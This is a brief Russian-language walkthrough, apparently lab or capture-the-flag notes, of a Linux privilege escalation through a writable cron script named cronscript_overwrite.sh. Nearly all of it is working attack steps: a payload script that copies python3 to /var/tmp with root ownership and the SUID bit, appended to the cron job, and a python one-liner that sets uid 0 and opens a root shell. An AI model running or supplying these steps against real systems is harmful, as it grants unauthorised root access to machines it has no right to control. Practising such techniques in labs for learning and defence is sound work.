Находим 2 скрипта и можем изменить cronscript_overwrite.sh
![](../../attachment/Pasted%20image%2020250623100138.png)
Создаем payload.sh и добавляем в конец скрипта запуска /var/tmp/payload.sh
```
#!/bin/bash 
cp /usr/bin/python3 /var/tmp/python3 
chown root:root /var/tmp/python3 
chmod u+s /var/tmp/python3
```
Дожидаемся выполнения cron задачи и получаем рут права 
```
/var/tmp/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
